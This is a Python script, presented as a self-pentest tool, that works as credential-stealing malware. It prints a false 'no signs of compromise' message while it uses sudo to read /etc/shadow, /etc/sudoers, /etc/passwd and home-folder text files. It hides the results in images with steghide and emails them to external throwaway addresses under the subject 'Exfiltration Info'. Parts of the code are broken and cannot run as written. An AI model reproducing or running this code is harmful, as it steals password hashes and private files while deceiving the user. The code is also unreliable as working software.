# This is a python automation script meant for pen testing of ones own system. 
# This script will attempt to scan your computer for information, exfiltrate it,
# and then persist.

# This program will be made available through our Discord or Direct Message.
# Here we will explain how it works along with partial bits of code as demonstration.
# key - 4EA2A56396E4BB2C30897C1B8C090F54E8F2E1308780B8795E6B53A6E74FD814``
# iv - E69CCC163DA315AC46D66149421B2658

# Created by Hunter Schwager and Kyle McCarthy.

from carne import asada, secret_var, send_email
import subprocess
import pexpect
import smtplib
import os

# ------- QOL -------

export_section=''
section_header='-------------'
section_footer="-------------------------------------------\n"

# ------- Header -------

print("-------------Nat1 Configurations-------------")
print("The following system scan shows no signs of system degradation or compromise.")
print("-------------------------------------------\n")

# ------- Functions -------

def sudo_command(command, report):

    log_update_counter=0

    if report==True:
        sudo_access = pexpect.spawn(command)

    else:
        sudo_access = pexpect.spawn(command)
    
    sudo_access.expect('for', timeout=1000)
    sudo_access.sendline('password')
    sudo_access.expect(pexpect.EOF)
    output = sudo_access.before.decode('utf-8')

    if report==True:
        with open ('API_KEY_nat1-0103' + str(log_update_counter) + 'fGs0d86asd89sGrEDA3.conf', 'w') as file:
            file.write(output)

        log_update_counter += 1
    
    return output
       
def mosquito_in_amber():

    sudo_access = pexpect.spawn('sudo apt install -y steghide')
    sudo_access.expect('for', timeout=1000)
    sudo_access.sendline('password')
    sudo_access.expect(pexpect.EOF)

    sudo_command('sudo chmod +x steg.jpg && chmod +x dfstd.jpg', False)

def steg_command(to_be_hidden, to_hide):
    sudo_access = pexpect.spawn('sudo steghide embed -cf ' + to_hide + ' -ef ' + to_be_hidden)
    sudo_access.expect('password', timeout=1000)
    sudo_access.sendline('password')
    sudo_access.expect(':')
    sudo_access.sendline('carneasada')

# ------- Command Class -------

class SkillCheck:
    command_input = []

    def __init__(self, name):
        self.name= name

    def proficiency(self, ability_score):
            print("\n", section_header + self.name + section_header)
            self = subprocess.run(ability_score.split())
            print(section_footer)
            return self

    def inspiration(input, ability_score, report):
        sudo_command(ability_score, report)

    def investigation(self, directory, search, report):
        print("\n", section_header + self.name + section_header)
        command = 'sudo find ' + directory + ' -type f -iname ' + search
        files_to_search = sudo_command(command, report)
        print(files_to_search)

def basicScan():

# ------- Inspiration -------

    etcshadow_bot = SkillCheck("Home Directory Health")
    etcshadow_bot.inspiration('sudo cat /etc/shadow', True)

    poncho_bot = SkillCheck("Privilege Audit")
    poncho_bot.inspiration('sudo cat /etc/sudoers', True)

# ------- Investigation -------

    home_bot = SkillCheck("Home Folder | .txt")
    home_bot.investigation('/home/', '*.txt', True) 

# ------- Proficiency -------

    ip_addr_bot = SkillCheck("IP")
    ip_addr_bot.proficiency('ip addr')

    online_users_bot = SkillCheck("Online Users")
    online_users_bot.proficiency('who')

    passwd_bot = SkillCheck("/etc/passwd")
    passwd_bot.proficiency('cat /etc/passwd')

    host_bot = SkillCheck("Host System")
    host_bot.proficiency('uname -a')

    group_bot = SkillCheck("Groups")
    group_bot.proficiency("cat /etc/group")

# ------- Exfiltration -------

def secret_ingredient():
    mosquito_in_amber()

    steg_command('API_KEY_nat1-0103fGs0d86asd89sGrEDA3.conf', 'steg.png')
    steg_command(asada, 'dfstd.png')

def one_mail():
    send_email(
        'living.like.bob.was.taken@gmail.com',
        secret_var,
        'riwos15373@pngzero.com',
        'Exfiltration Info',
        'Two pictures that are not at all dinosaur related.',
        './steg.jpg'
    )
    
    send_email(
        'living.like.bob.was.taken@gmail.com',
        secret_var,
        'radecab534@lewou.com',
        'Exfiltration Info',
        'Two pictures that are not at all dinosaur related.',
        './dfstd.jpg'
    )

def combine_logs(directory):

    subprocess.run(['mkdir', 'logs'])
    
    with open('./logs/API_KEY_nat1-0103fGs0d86asd89sGrEDA3.conf', 'w') as file:
        file.write('===========================================================')
    

for log in os.listdir(directory):
        if filename.startswith('API_KEY_nat1'):
            with open('./logs/API_KEY_nat1-0103fGs0d86asd89sGrEDA3.conf', 'a') as file:
                file.write(log)

# ------- Execution -------

def __main__():
    secret_ingredient()
    basicScan()
    combine_logs('./logs')
    one_mail()
    


if __name__ == '__main__':
    __main__()
